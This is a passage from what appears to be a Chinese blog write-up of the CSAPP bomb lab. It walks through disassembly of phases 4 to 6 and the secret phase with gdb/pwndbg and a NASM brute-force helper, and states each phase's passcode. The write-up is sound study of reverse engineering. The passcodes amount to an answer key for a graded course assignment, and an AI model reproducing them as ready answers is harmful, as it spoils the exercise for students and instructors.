\u0026lt;phase_3+50\u0026gt; jmp qword ptr [rax*8 + 0x402470] ↓ ► 0x400fb9 \u0026lt;phase_3+118\u0026gt; mov eax, 0x137 0x400fbe \u0026lt;phase_3+123\u0026gt; cmp eax, dword ptr [rsp + 0xc] 0x400fc2 \u0026lt;phase_3+127\u0026gt; je phase_3+134 \u0026lt;phase_3+134\u0026gt; 得一个合法的解是：1 311\necho \u0026quot;1 311\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_4 先来看看phase_4函数的反汇编：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 0x000000000040100c \u0026lt;+0\u0026gt;: sub rsp,0x18 0x0000000000401010 \u0026lt;+4\u0026gt;: lea rcx,[rsp+0xc] 0x0000000000401015 \u0026lt;+9\u0026gt;: lea rdx,[rsp+0x8] 0x000000000040101a \u0026lt;+14\u0026gt;: mov esi,0x4025cf 0x000000000040101f \u0026lt;+19\u0026gt;: mov eax,0x0 0x0000000000401024 \u0026lt;+24\u0026gt;: call 0x400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 0x0000000000401029 \u0026lt;+29\u0026gt;: cmp eax,0x2 0x000000000040102c \u0026lt;+32\u0026gt;: jne 0x401035 \u0026lt;phase_4+41\u0026gt; 0x000000000040102e \u0026lt;+34\u0026gt;: cmp DWORD PTR [rsp+0x8],0xe 0x0000000000401033 \u0026lt;+39\u0026gt;: jbe 0x40103a \u0026lt;phase_4+46\u0026gt; 0x0000000000401035 \u0026lt;+41\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x000000000040103a \u0026lt;+46\u0026gt;: mov edx,0xe 0x000000000040103f \u0026lt;+51\u0026gt;: mov esi,0x0 0x0000000000401044 \u0026lt;+56\u0026gt;: mov edi,DWORD PTR [rsp+0x8] 0x0000000000401048 \u0026lt;+60\u0026gt;: call 0x400fce \u0026lt;func4\u0026gt; 0x000000000040104d \u0026lt;+65\u0026gt;: test eax,eax 0x000000000040104f \u0026lt;+67\u0026gt;: jne 0x401058 \u0026lt;phase_4+76\u0026gt; 0x0000000000401051 \u0026lt;+69\u0026gt;: cmp DWORD PTR [rsp+0xc],0x0 0x0000000000401056 \u0026lt;+74\u0026gt;: je 0x40105d \u0026lt;phase_4+81\u0026gt; 0x0000000000401058 \u0026lt;+76\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x000000000040105d \u0026lt;+81\u0026gt;: add rsp,0x18 0x0000000000401061 \u0026lt;+85\u0026gt;: ret 可知这一关也是让我们输入两个数字a b，且要满足如下条件：\n(unsigned)a \u0026lt; 14 b == 0 func4(a, 0, 14) == 0 func4反汇编如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 0x0000000000400fce \u0026lt;+0\u0026gt;: sub rsp,0x8 0x0000000000400fd2 \u0026lt;+4\u0026gt;: mov eax,edx 0x0000000000400fd4 \u0026lt;+6\u0026gt;: sub eax,esi 0x0000000000400fd6 \u0026lt;+8\u0026gt;: mov ecx,eax 0x0000000000400fd8 \u0026lt;+10\u0026gt;: shr ecx,0x1f 0x0000000000400fdb \u0026lt;+13\u0026gt;: add eax,ecx 0x0000000000400fdd \u0026lt;+15\u0026gt;: sar eax,1 0x0000000000400fdf \u0026lt;+17\u0026gt;: lea ecx,[rax+rsi*1] 0x0000000000400fe2 \u0026lt;+20\u0026gt;: cmp ecx,edi 0x0000000000400fe4 \u0026lt;+22\u0026gt;: jle 0x400ff2 \u0026lt;func4+36\u0026gt; 0x0000000000400fe6 \u0026lt;+24\u0026gt;: lea edx,[rcx-0x1] 0x0000000000400fe9 \u0026lt;+27\u0026gt;: call 0x400fce \u0026lt;func4\u0026gt; 0x0000000000400fee \u0026lt;+32\u0026gt;: add eax,eax 0x0000000000400ff0 \u0026lt;+34\u0026gt;: jmp 0x401007 \u0026lt;func4+57\u0026gt; 0x0000000000400ff2 \u0026lt;+36\u0026gt;: mov eax,0x0 0x0000000000400ff7 \u0026lt;+41\u0026gt;: cmp ecx,edi 0x0000000000400ff9 \u0026lt;+43\u0026gt;: jge 0x401007 \u0026lt;func4+57\u0026gt; 0x0000000000400ffb \u0026lt;+45\u0026gt;: lea esi,[rcx+0x1] 0x0000000000400ffe \u0026lt;+48\u0026gt;: call 0x400fce \u0026lt;func4\u0026gt; 0x0000000000401003 \u0026lt;+53\u0026gt;: lea eax,[rax+rax*1+0x1] 0x0000000000401007 \u0026lt;+57\u0026gt;: add rsp,0x8 0x000000000040100b \u0026lt;+61\u0026gt;: ret func4是一个递归函数，IDA反编译得，仅供参考：\n1 2 3 4 5 6 7 8 9 10 11 12 13 __int64 __fastcall func4(__int64 a1, __int64 a2, int a3) { int v3; // ecx __int64 result; // rax v3 = (a3 - (int)a2) / 2 + a2; if ( v3 \u0026gt; (int)a1 ) return 2 * (unsigned int)func4(a1, a2); result = 0LL; if ( v3 \u0026lt; (int)a1 ) return 2 * (unsigned int)func4(a1, (unsigned int)(v3 + 1)) + 1; return result; } 将func4反汇编函数重写为可编译的形式后，编写汇编程序对此函数暴力枚举：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 global _start section .rodata s_msg: db \u0026#34;satisfy!!\u0026#34;, 10 d_msg: db \u0026#34;failed!!!\u0026#34;, 10 section .text func4: sub rsp,0x8 mov eax,edx sub eax,esi mov ecx,eax shr ecx,0x1f add eax,ecx sar eax,1 lea ecx,[rax+rsi*1] cmp ecx,edi jle p36 lea edx,[rcx-0x1] call func4 add eax,eax jmp p57 p36: mov eax,0x0 cmp ecx,edi jge p57 lea esi,[rcx+0x1] call func4 lea eax,[rax+rax*1+0x1] p57: add rsp,0x8 ret _start: mov r12, -1 loop: add r12, 1 cmp r12, 10 je exit mov rdi, r12 mov rsi, 0 mov rdx, 14 call func4 test eax, eax jne dissatisfy mov rsi, s_msg jmp print dissatisfy: mov rsi, d_msg print: mov rax, 1 mov rdi, 1 mov rdx, 10 syscall jmp loop exit: mov rax, 60 mov rdi, 0 syscall 汇编并运行：\n1 2 3 nasm -f elf64 -o phase_4.o phase_4.S ld -o phase_4 phase_4.o ./phase_4 由输出可得，0～9中满足条件的解为0、1、3、7\n故此关的一个合法解为7 0\necho \u0026quot;7 0\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_5 phase_5函数反汇编：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 0x0000000000401062 \u0026lt;+0\u0026gt;: push rbx 0x0000000000401063 \u0026lt;+1\u0026gt;: sub rsp,0x20 0x0000000000401067 \u0026lt;+5\u0026gt;: mov rbx,rdi 0x000000000040106a \u0026lt;+8\u0026gt;: mov rax,QWORD PTR fs:0x28 0x0000000000401073 \u0026lt;+17\u0026gt;: mov QWORD PTR [rsp+0x18],rax 0x0000000000401078 \u0026lt;+22\u0026gt;: xor eax,eax 0x000000000040107a \u0026lt;+24\u0026gt;: call 0x40131b \u0026lt;string_length\u0026gt; 0x000000000040107f \u0026lt;+29\u0026gt;: cmp eax,0x6 0x0000000000401082 \u0026lt;+32\u0026gt;: je 0x4010d2 \u0026lt;phase_5+112\u0026gt; 0x0000000000401084 \u0026lt;+34\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401089 \u0026lt;+39\u0026gt;: jmp 0x4010d2 \u0026lt;phase_5+112\u0026gt; 0x000000000040108b \u0026lt;+41\u0026gt;: movzx ecx,BYTE PTR [rbx+rax*1] 0x000000000040108f \u0026lt;+45\u0026gt;: mov BYTE PTR [rsp],cl 0x0000000000401092 \u0026lt;+48\u0026gt;: mov rdx,QWORD PTR [rsp] 0x0000000000401096 \u0026lt;+52\u0026gt;: and edx,0xf 0x0000000000401099 \u0026lt;+55\u0026gt;: movzx edx,BYTE PTR [rdx+0x4024b0] 0x00000000004010a0 \u0026lt;+62\u0026gt;: mov BYTE PTR [rsp+rax*1+0x10],dl 0x00000000004010a4 \u0026lt;+66\u0026gt;: add rax,0x1 0x00000000004010a8 \u0026lt;+70\u0026gt;: cmp rax,0x6 0x00000000004010ac \u0026lt;+74\u0026gt;: jne 0x40108b \u0026lt;phase_5+41\u0026gt; 0x00000000004010ae \u0026lt;+76\u0026gt;: mov BYTE PTR [rsp+0x16],0x0 0x00000000004010b3 \u0026lt;+81\u0026gt;: mov esi,0x40245e 0x00000000004010b8 \u0026lt;+86\u0026gt;: lea rdi,[rsp+0x10] 0x00000000004010bd \u0026lt;+91\u0026gt;: call 0x401338 \u0026lt;strings_not_equal\u0026gt; 0x00000000004010c2 \u0026lt;+96\u0026gt;: test eax,eax 0x00000000004010c4 \u0026lt;+98\u0026gt;: je 0x4010d9 \u0026lt;phase_5+119\u0026gt; 0x00000000004010c6 \u0026lt;+100\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x00000000004010cb \u0026lt;+105\u0026gt;: nop DWORD PTR [rax+rax*1+0x0] 0x00000000004010d0 \u0026lt;+110\u0026gt;: jmp 0x4010d9 \u0026lt;phase_5+119\u0026gt; 0x00000000004010d2 \u0026lt;+112\u0026gt;: mov eax,0x0 0x00000000004010d7 \u0026lt;+117\u0026gt;: jmp 0x40108b \u0026lt;phase_5+41\u0026gt; 0x00000000004010d9 \u0026lt;+119\u0026gt;: mov rax,QWORD PTR [rsp+0x18] 0x00000000004010de \u0026lt;+124\u0026gt;: xor rax,QWORD PTR fs:0x28 0x00000000004010e7 \u0026lt;+133\u0026gt;: je 0x4010ee \u0026lt;phase_5+140\u0026gt; 0x00000000004010e9 \u0026lt;+135\u0026gt;: call 0x400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x00000000004010ee \u0026lt;+140\u0026gt;: add rsp,0x20 0x00000000004010f2 \u0026lt;+144\u0026gt;: pop rbx 0x00000000004010f3 \u0026lt;+145\u0026gt;: ret 其中：\n1 2 3 4 pwndbg\u0026gt; x/s 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;: \u0026#34;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\u0026#34; pwndbg\u0026gt; x/s 0x40245e 0x40245e: \u0026#34;flyers\u0026#34; 可知校验逻辑如下：\n判断输入的字符串长度是否为6 循环6次如下操作： 以当前字符与0xf做\u0026amp;运算，ch \u0026amp; 0xf得到的结果为索引，从字符串常量maduiersnfotvbyl中取出对应字符 判断取出的6个字符是否为flyers 故可得一个解为：ionefg\necho \u0026quot;ionefg\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_6 点击展开phase_6函数的完整反汇编 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 0x00000000004010f4 \u0026lt;+0\u0026gt;: push r14 0x00000000004010f6 \u0026lt;+2\u0026gt;: push r13 0x00000000004010f8 \u0026lt;+4\u0026gt;: push r12 0x00000000004010fa \u0026lt;+6\u0026gt;: push rbp 0x00000000004010fb \u0026lt;+7\u0026gt;: push rbx 0x00000000004010fc \u0026lt;+8\u0026gt;: sub rsp,0x50 0x0000000000401100 \u0026lt;+12\u0026gt;: mov r13,rsp 0x0000000000401103 \u0026lt;+15\u0026gt;: mov rsi,rsp 0x0000000000401106 \u0026lt;+18\u0026gt;: call 0x40145c \u0026lt;read_six_numbers\u0026gt; 0x000000000040110b \u0026lt;+23\u0026gt;: mov r14,rsp 0x000000000040110e \u0026lt;+26\u0026gt;: mov r12d,0x0 0x0000000000401114 \u0026lt;+32\u0026gt;: mov rbp,r13 0x0000000000401117 \u0026lt;+35\u0026gt;: mov eax,DWORD PTR [r13+0x0] 0x000000000040111b \u0026lt;+39\u0026gt;: sub eax,0x1 0x000000000040111e \u0026lt;+42\u0026gt;: cmp eax,0x5 0x0000000000401121 \u0026lt;+45\u0026gt;: jbe 0x401128 \u0026lt;phase_6+52\u0026gt; 0x0000000000401123 \u0026lt;+47\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401128 \u0026lt;+52\u0026gt;: add r12d,0x1 0x000000000040112c \u0026lt;+56\u0026gt;: cmp r12d,0x6 0x0000000000401130 \u0026lt;+60\u0026gt;: je 0x401153 \u0026lt;phase_6+95\u0026gt; 0x0000000000401132 \u0026lt;+62\u0026gt;: mov ebx,r12d 0x0000000000401135 \u0026lt;+65\u0026gt;: movsxd rax,ebx 0x0000000000401138 \u0026lt;+68\u0026gt;: mov eax,DWORD PTR [rsp+rax*4] 0x000000000040113b \u0026lt;+71\u0026gt;: cmp DWORD PTR [rbp+0x0],eax 0x000000000040113e \u0026lt;+74\u0026gt;: jne 0x401145 \u0026lt;phase_6+81\u0026gt; 0x0000000000401140 \u0026lt;+76\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401145 \u0026lt;+81\u0026gt;: add ebx,0x1 0x0000000000401148 \u0026lt;+84\u0026gt;: cmp ebx,0x5 0x000000000040114b \u0026lt;+87\u0026gt;: jle 0x401135 \u0026lt;phase_6+65\u0026gt; 0x000000000040114d \u0026lt;+89\u0026gt;: add r13,0x4 0x0000000000401151 \u0026lt;+93\u0026gt;: jmp 0x401114 \u0026lt;phase_6+32\u0026gt; 0x0000000000401153 \u0026lt;+95\u0026gt;: lea rsi,[rsp+0x18] 0x0000000000401158 \u0026lt;+100\u0026gt;: mov rax,r14 0x000000000040115b \u0026lt;+103\u0026gt;: mov ecx,0x7 0x0000000000401160 \u0026lt;+108\u0026gt;: mov edx,ecx 0x0000000000401162 \u0026lt;+110\u0026gt;: sub edx,DWORD PTR [rax] 0x0000000000401164 \u0026lt;+112\u0026gt;: mov DWORD PTR [rax],edx 0x0000000000401166 \u0026lt;+114\u0026gt;: add rax,0x4 0x000000000040116a \u0026lt;+118\u0026gt;: cmp rax,rsi 0x000000000040116d \u0026lt;+121\u0026gt;: jne 0x401160 \u0026lt;phase_6+108\u0026gt; 0x000000000040116f \u0026lt;+123\u0026gt;: mov esi,0x0 0x0000000000401174 \u0026lt;+128\u0026gt;: jmp 0x401197 \u0026lt;phase_6+163\u0026gt; 0x0000000000401176 \u0026lt;+130\u0026gt;: mov rdx,QWORD PTR [rdx+0x8] 0x000000000040117a \u0026lt;+134\u0026gt;: add eax,0x1 0x000000000040117d \u0026lt;+137\u0026gt;: cmp eax,ecx 0x000000000040117f \u0026lt;+139\u0026gt;: jne 0x401176 \u0026lt;phase_6+130\u0026gt; 0x0000000000401181 \u0026lt;+141\u0026gt;: jmp 0x401188 \u0026lt;phase_6+148\u0026gt; 0x0000000000401183 \u0026lt;+143\u0026gt;: mov edx,0x6032d0 0x0000000000401188 \u0026lt;+148\u0026gt;: mov QWORD PTR [rsp+rsi*2+0x20],rdx 0x000000000040118d \u0026lt;+153\u0026gt;: add rsi,0x4 0x0000000000401191 \u0026lt;+157\u0026gt;: cmp rsi,0x18 0x0000000000401195 \u0026lt;+161\u0026gt;: je 0x4011ab \u0026lt;phase_6+183\u0026gt; 0x0000000000401197 \u0026lt;+163\u0026gt;: mov ecx,DWORD PTR [rsp+rsi*1] 0x000000000040119a \u0026lt;+166\u0026gt;: cmp ecx,0x1 0x000000000040119d \u0026lt;+169\u0026gt;: jle 0x401183 \u0026lt;phase_6+143\u0026gt; 0x000000000040119f \u0026lt;+171\u0026gt;: mov eax,0x1 0x00000000004011a4 \u0026lt;+176\u0026gt;: mov edx,0x6032d0 0x00000000004011a9 \u0026lt;+181\u0026gt;: jmp 0x401176 \u0026lt;phase_6+130\u0026gt; 0x00000000004011ab \u0026lt;+183\u0026gt;: mov rbx,QWORD PTR [rsp+0x20] 0x00000000004011b0 \u0026lt;+188\u0026gt;: lea rax,[rsp+0x28] 0x00000000004011b5 \u0026lt;+193\u0026gt;: lea rsi,[rsp+0x50] 0x00000000004011ba \u0026lt;+198\u0026gt;: mov rcx,rbx 0x00000000004011bd \u0026lt;+201\u0026gt;: mov rdx,QWORD PTR [rax] 0x00000000004011c0 \u0026lt;+204\u0026gt;: mov QWORD PTR [rcx+0x8],rdx 0x00000000004011c4 \u0026lt;+208\u0026gt;: add rax,0x8 0x00000000004011c8 \u0026lt;+212\u0026gt;: cmp rax,rsi 0x00000000004011cb \u0026lt;+215\u0026gt;: je 0x4011d2 \u0026lt;phase_6+222\u0026gt; 0x00000000004011cd \u0026lt;+217\u0026gt;: mov rcx,rdx 0x00000000004011d0 \u0026lt;+220\u0026gt;: jmp 0x4011bd \u0026lt;phase_6+201\u0026gt; 0x00000000004011d2 \u0026lt;+222\u0026gt;: mov QWORD PTR [rdx+0x8],0x0 0x00000000004011da \u0026lt;+230\u0026gt;: mov ebp,0x5 0x00000000004011df \u0026lt;+235\u0026gt;: mov rax,QWORD PTR [rbx+0x8] 0x00000000004011e3 \u0026lt;+239\u0026gt;: mov eax,DWORD PTR [rax] 0x00000000004011e5 \u0026lt;+241\u0026gt;: cmp DWORD PTR [rbx],eax 0x00000000004011e7 \u0026lt;+243\u0026gt;: jge 0x4011ee \u0026lt;phase_6+250\u0026gt; 0x00000000004011e9 \u0026lt;+245\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x00000000004011ee \u0026lt;+250\u0026gt;: mov rbx,QWORD PTR [rbx+0x8] 0x00000000004011f2 \u0026lt;+254\u0026gt;: sub ebp,0x1 0x00000000004011f5 \u0026lt;+257\u0026gt;: jne 0x4011df \u0026lt;phase_6+235\u0026gt; 0x00000000004011f7 \u0026lt;+259\u0026gt;: add rsp,0x50 0x00000000004011fb \u0026lt;+263\u0026gt;: pop rbx 0x00000000004011fc \u0026lt;+264\u0026gt;: pop rbp 0x00000000004011fd \u0026lt;+265\u0026gt;: pop r12 0x00000000004011ff \u0026lt;+267\u0026gt;: pop r13 0x0000000000401201 \u0026lt;+269\u0026gt;: pop r14 0x0000000000401203 \u0026lt;+271\u0026gt;: ret 逻辑较长，我们分块分析\n首先有read_six_numbers函数，读入6个数字：\n1 0x0000000000401106 \u0026lt;+18\u0026gt;: call 0x40145c \u0026lt;read_six_numbers\u0026gt; 接着是一个二层循环结构：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 0x0000000000401114 \u0026lt;+32\u0026gt;: mov rbp,r13 0x0000000000401117 \u0026lt;+35\u0026gt;: mov eax,DWORD PTR [r13+0x0] 0x000000000040111b \u0026lt;+39\u0026gt;: sub eax,0x1 0x000000000040111e \u0026lt;+42\u0026gt;: cmp eax,0x5 0x0000000000401121 \u0026lt;+45\u0026gt;: jbe 0x401128 \u0026lt;phase_6+52\u0026gt; 0x0000000000401123 \u0026lt;+47\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401128 \u0026lt;+52\u0026gt;: add r12d,0x1 0x000000000040112c \u0026lt;+56\u0026gt;: cmp r12d,0x6 0x0000000000401130 \u0026lt;+60\u0026gt;: je 0x401153 \u0026lt;phase_6+95\u0026gt; 0x0000000000401132 \u0026lt;+62\u0026gt;: mov ebx,r12d 0x0000000000401135 \u0026lt;+65\u0026gt;: movsxd rax,ebx 0x0000000000401138 \u0026lt;+68\u0026gt;: mov eax,DWORD PTR [rsp+rax*4] 0x000000000040113b \u0026lt;+71\u0026gt;: cmp DWORD PTR [rbp+0x0],eax 0x000000000040113e \u0026lt;+74\u0026gt;: jne 0x401145 \u0026lt;phase_6+81\u0026gt; 0x0000000000401140 \u0026lt;+76\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401145 \u0026lt;+81\u0026gt;: add ebx,0x1 0x0000000000401148 \u0026lt;+84\u0026gt;: cmp ebx,0x5 0x000000000040114b \u0026lt;+87\u0026gt;: jle 0x401135 \u0026lt;phase_6+65\u0026gt; 0x000000000040114d \u0026lt;+89\u0026gt;: add r13,0x4 0x0000000000401151 \u0026lt;+93\u0026gt;: jmp 0x401114 \u0026lt;phase_6+32\u0026gt; 对应的功能为检测：\n输入的数字大小在[1,6]中 6个数字无重复 接下来是一个一层循环结构：\n1 2 3 4 5 6 7 8 9 0x0000000000401153 \u0026lt;+95\u0026gt;: lea rsi,[rsp+0x18] 0x0000000000401158 \u0026lt;+100\u0026gt;: mov rax,r14 0x000000000040115b \u0026lt;+103\u0026gt;: mov ecx,0x7 0x0000000000401160 \u0026lt;+108\u0026gt;: mov edx,ecx 0x0000000000401162 \u0026lt;+110\u0026gt;: sub edx,DWORD PTR [rax] 0x0000000000401164 \u0026lt;+112\u0026gt;: mov DWORD PTR [rax],edx 0x0000000000401166 \u0026lt;+114\u0026gt;: add rax,0x4 0x000000000040116a \u0026lt;+118\u0026gt;: cmp rax,rsi 0x000000000040116d \u0026lt;+121\u0026gt;: jne 0x401160 \u0026lt;phase_6+108\u0026gt; 用于实现：input_numbers[i] = 7 - input_numbers[i]\n接下来又是一个循环结构：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 0x000000000040116f \u0026lt;+123\u0026gt;: mov esi,0x0 0x0000000000401174 \u0026lt;+128\u0026gt;: jmp 0x401197 \u0026lt;phase_6+163\u0026gt; 0x0000000000401176 \u0026lt;+130\u0026gt;: mov rdx,QWORD PTR [rdx+0x8] 0x000000000040117a \u0026lt;+134\u0026gt;: add eax,0x1 0x000000000040117d \u0026lt;+137\u0026gt;: cmp eax,ecx 0x000000000040117f \u0026lt;+139\u0026gt;: jne 0x401176 \u0026lt;phase_6+130\u0026gt; 0x0000000000401181 \u0026lt;+141\u0026gt;: jmp 0x401188 \u0026lt;phase_6+148\u0026gt; 0x0000000000401183 \u0026lt;+143\u0026gt;: mov edx,0x6032d0 0x0000000000401188 \u0026lt;+148\u0026gt;: mov QWORD PTR [rsp+rsi*2+0x20],rdx 0x000000000040118d \u0026lt;+153\u0026gt;: add rsi,0x4 0x0000000000401191 \u0026lt;+157\u0026gt;: cmp rsi,0x18 0x0000000000401195 \u0026lt;+161\u0026gt;: je 0x4011ab \u0026lt;phase_6+183\u0026gt; 0x0000000000401197 \u0026lt;+163\u0026gt;: mov ecx,DWORD PTR [rsp+rsi*1] 0x000000000040119a \u0026lt;+166\u0026gt;: cmp ecx,0x1 0x000000000040119d \u0026lt;+169\u0026gt;: jle 0x401183 \u0026lt;phase_6+143\u0026gt; 0x000000000040119f \u0026lt;+171\u0026gt;: mov eax,0x1 0x00000000004011a4 \u0026lt;+176\u0026gt;: mov edx,0x6032d0 0x00000000004011a9 \u0026lt;+181\u0026gt;: jmp 0x401176 \u0026lt;phase_6+130\u0026gt; 0x6032d0处保存的为node链表，数据域和指针域类型分别为int和int*：\n1 2 3 4 5 6 7 pwndbg\u0026gt; x/12 0x6032d0 0x6032d0 \u0026lt;node1\u0026gt;: 0x000000010000014c 0x00000000006032e0 0x6032e0 \u0026lt;node2\u0026gt;: 0x00000002000000a8 0x00000000006032f0 0x6032f0 \u0026lt;node3\u0026gt;: 0x000000030000039c 0x0000000000603300 0x603300 \u0026lt;node4\u0026gt;: 0x00000004000002b3 0x0000000000603310 0x603310 \u0026lt;node5\u0026gt;: 0x00000005000001dd 0x0000000000603320 0x603320 \u0026lt;node6\u0026gt;: 0x00000006000001bb 0x0000000000000000 这部分是将经过上一步计算的6个数作为索引，分别取出对应node的所在地址，并存放于栈上\n接着又是一个循环：\n1 2 3 4 5 6 7 8 9 10 11 0x00000000004011ab \u0026lt;+183\u0026gt;: mov rbx,QWORD PTR [rsp+0x20] 0x00000000004011b0 \u0026lt;+188\u0026gt;: lea rax,[rsp+0x28] 0x00000000004011b5 \u0026lt;+193\u0026gt;: lea rsi,[rsp+0x50] 0x00000000004011ba \u0026lt;+198\u0026gt;: mov rcx,rbx 0x00000000004011bd \u0026lt;+201\u0026gt;: mov rdx,QWORD PTR [rax] 0x00000000004011c0 \u0026lt;+204\u0026gt;: mov QWORD PTR [rcx+0x8],rdx 0x00000000004011c4 \u0026lt;+208\u0026gt;: add rax,0x8 0x00000000004011c8 \u0026lt;+212\u0026gt;: cmp rax,rsi 0x00000000004011cb \u0026lt;+215\u0026gt;: je 0x4011d2 \u0026lt;phase_6+222\u0026gt; 0x00000000004011cd \u0026lt;+217\u0026gt;: mov rcx,rdx 0x00000000004011d0 \u0026lt;+220\u0026gt;: jmp 0x4011bd \u0026lt;phase_6+201\u0026gt; 用于将0x6032d0处的node链表顺序修改为和上一步得到的栈数组相同的顺序\n然后就是最终的校验了：\n1 2 3 4 5 6 7 8 9 10 0x00000000004011d2 \u0026lt;+222\u0026gt;: mov QWORD PTR [rdx+0x8],0x0 0x00000000004011da \u0026lt;+230\u0026gt;: mov ebp,0x5 0x00000000004011df \u0026lt;+235\u0026gt;: mov rax,QWORD PTR [rbx+0x8] 0x00000000004011e3 \u0026lt;+239\u0026gt;: mov eax,DWORD PTR [rax] 0x00000000004011e5 \u0026lt;+241\u0026gt;: cmp DWORD PTR [rbx],eax 0x00000000004011e7 \u0026lt;+243\u0026gt;: jge 0x4011ee \u0026lt;phase_6+250\u0026gt; 0x00000000004011e9 \u0026lt;+245\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x00000000004011ee \u0026lt;+250\u0026gt;: mov rbx,QWORD PTR [rbx+0x8] 0x00000000004011f2 \u0026lt;+254\u0026gt;: sub ebp,0x1 0x00000000004011f5 \u0026lt;+257\u0026gt;: jne 0x4011df \u0026lt;phase_6+235\u0026gt; 判断由上一步得到的链表中的数据是否为逐级递减的\n原始链表数据大小关系为：node3 \u0026gt; node4 \u0026gt; node5 \u0026gt; node6 \u0026gt; node1 \u0026gt; node2\n故我们需要输入：4 3 2 1 6 5\necho \u0026quot;4 3 2 1 6 5\u0026quot; \u0026gt;\u0026gt; passcodes\nsecret_phase 我们成功解除了炸弹？观测到bomb.c的末尾有：\n1 2 3 4 5 6 7 8 9 ...... phase_6(input); phase_defused(); /* Wow, they got it! But isn\u0026#39;t something... missing? Perhaps * something they overlooked? Mua ha ha ha ha! */ return 0; } 看起来不妙，我们在此打断点调试跟进试试： gdb -ex \u0026quot;b bomb.c:109\u0026quot; -ex \u0026quot;r\u0026quot; --args bomb passcodes\n跟进phase_defused函数，观测到：\n1 2 3 4 5 6 7 8 9 10 11 12 13 0x4015f0 \u0026lt;phase_defused+44\u0026gt; mov esi, 0x402619 0x4015f5 \u0026lt;phase_defused+49\u0026gt; mov edi, input_strings+240 \u0026lt;0x603870\u0026gt; ► 0x4015fa \u0026lt;phase_defused+54\u0026gt; call __isoc99_sscanf@plt \u0026lt;__isoc99_sscanf@plt\u0026gt; s: 0x603870 (input_strings+240) ◂— 0x302037 /* \u0026#39;7 0\u0026#39; */ format: 0x402619 ◂— \u0026#39;%d %d %s\u0026#39; vararg: 0x7fffffffe038 ◂— 0x600000005 0x4015ff \u0026lt;phase_defused+59\u0026gt; cmp eax, 3 0x401602 \u0026lt;phase_defused+62\u0026gt; jne phase_defused+113 \u0026lt;phase_defused+113\u0026gt; 0x401604 \u0026lt;phase_defused+64\u0026gt; mov esi, 0x402622 0x401609 \u0026lt;phase_defused+69\u0026gt; lea rdi, [rsp + 0x10] 0x40160e \u0026lt;phase_defused+74\u0026gt; call strings_not_equal \u0026lt;strings_not_equal\u0026gt; 其中：\n1 2 3 4 pwndbg\u0026gt; x/s 0x402619 0x402619: \u0026#34;%d %d %s\u0026#34; pwndbg\u0026gt; x/s 0x603870 0x603870 \u0026lt;input_strings+240\u0026gt;: \u0026#34;7 0\u0026#34; 看来这在读取第四关的两个数字时，还试图在后面读取一个字符串。阅读反汇编后发现，是用于在下方strings_not_equal函数中与0x402622处的字符串进行比较：\n1 2 pwndbg\u0026gt; x/s 0x402622 0x402622: \u0026#34;DrEvil\u0026#34; 所以我们在第四关的输入后追加字符串DrEvil，即可进入隐藏关卡：gdb -ex \u0026quot;b secret_phase\u0026quot; -ex \u0026quot;r\u0026quot; --args bomb passcodes\nsecret_phase函数反汇编如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 0x0000000000401242 \u0026lt;+0\u0026gt;: push rbx 0x0000000000401243 \u0026lt;+1\u0026gt;: call 0x40149e \u0026lt;read_line\u0026gt; 0x0000000000401248 \u0026lt;+6\u0026gt;: mov edx,0xa 0x000000000040124d \u0026lt;+11\u0026gt;: mov esi,0x0 0x0000000000401252 \u0026lt;+16\u0026gt;: mov rdi,rax 0x0000000000401255 \u0026lt;+19\u0026gt;: call 0x400bd0 \u0026lt;strtol@plt\u0026gt; 0x000000000040125a \u0026lt;+24\u0026gt;: mov rbx,rax 0x000000000040125d \u0026lt;+27\u0026gt;: lea eax,[rax-0x1] 0x0000000000401260 \u0026lt;+30\u0026gt;: cmp eax,0x3e8 0x0000000000401265 \u0026lt;+35\u0026gt;: jbe 0x40126c \u0026lt;secret_phase+42\u0026gt; 0x0000000000401267 \u0026lt;+37\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x000000000040126c \u0026lt;+42\u0026gt;: mov esi,ebx 0x000000000040126e \u0026lt;+44\u0026gt;: mov edi,0x6030f0 0x0000000000401273 \u0026lt;+49\u0026gt;: call 0x401204 \u0026lt;fun7\u0026gt; 0x0000000000401278 \u0026lt;+54\u0026gt;: cmp eax,0x2 0x000000000040127b \u0026lt;+57\u0026gt;: je 0x401282 \u0026lt;secret_phase+64\u0026gt; 0x000000000040127d 